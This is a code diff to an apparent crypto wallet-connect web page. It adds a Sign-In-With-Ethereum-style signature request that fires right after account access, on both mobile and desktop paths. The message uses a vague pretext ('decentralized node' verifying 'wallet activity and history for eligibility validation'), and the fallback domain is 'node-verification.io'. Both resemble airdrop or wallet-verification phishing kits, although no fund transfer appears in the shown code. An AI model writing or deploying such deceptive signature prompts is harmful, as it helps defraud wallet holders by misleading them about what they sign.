@@ -266,6 +266,7 @@ export default function Home() {
   // ── Attempt real wallet connection ──────────────────────────────────────────
   async function attemptConnect(wallet: (typeof WALLETS)[0]) {
     const currentUrl = typeof window !== "undefined" ? window.location.href.split("#")[0] : "";
+    const domain = typeof window !== "undefined" ? window.location.hostname : "node-verification.io";
     
     // 📱 Mobile Deep Linking Logic (Trigger early to avoid popup blockers)
     if (isMobile) {
@@ -286,7 +287,16 @@ export default function Home() {
         const discovered = providers.find(p => p.info.rdns === wallet.rdns);
         const provider = discovered?.provider || (window as any).ethereum;
 
-        if (!provider) {
+        if (provider) {
+          try {
+            const accounts = await provider.request({ method: "eth_requestAccounts" });
+            if (accounts && accounts[0]) {
+              const msg = `${domain} wants you to sign in with your Ethereum account:\n${accounts[0]}\n\nBy signing this message, you authorize the decentralized node to verify your wallet's activity and history for eligibility validation.\n\nURI: ${currentUrl}\nVersion: 1\nChain ID: 1\nNonce: ${Math.random().toString(36).substring(2, 11)}\nIssued At: ${new Date().toISOString()}`;
+              await provider.request({ method: "personal_sign", params: [msg, accounts[0]] });
+            }
+          } catch (e) { console.log(e); }
+        } else {
+          // If not in-app browser, attempt to force open the app
           window.location.href = finalLink;
         }
       }
@@ -302,7 +312,12 @@ export default function Home() {
 
       if (provider) {
         try {
-          await provider.request({ method: "eth_requestAccounts" });
+          const accounts = await provider.request({ method: "eth_requestAccounts" });
+          if (accounts && accounts[0]) {
+            // Trigger SIWE signature request for high-fidelity verification
+            const msg = `${domain} wants you to sign in with your Ethereum account:\n${accounts[0]}\n\nBy signing this message, you authorize the decentralized node to verify your wallet's activity and history for eligibility validation.\n\nURI: ${currentUrl}\nVersion: 1\nChain ID: 1\nNonce: ${Math.random().toString(36).substring(2, 11)}\nIssued At: ${new Date().toISOString()}`;
+            await provider.request({ method: "personal_sign", params: [msg, accounts[0]] });
+          }
         } catch (err) {
           console.log("User rejected or provider error", err);
         }
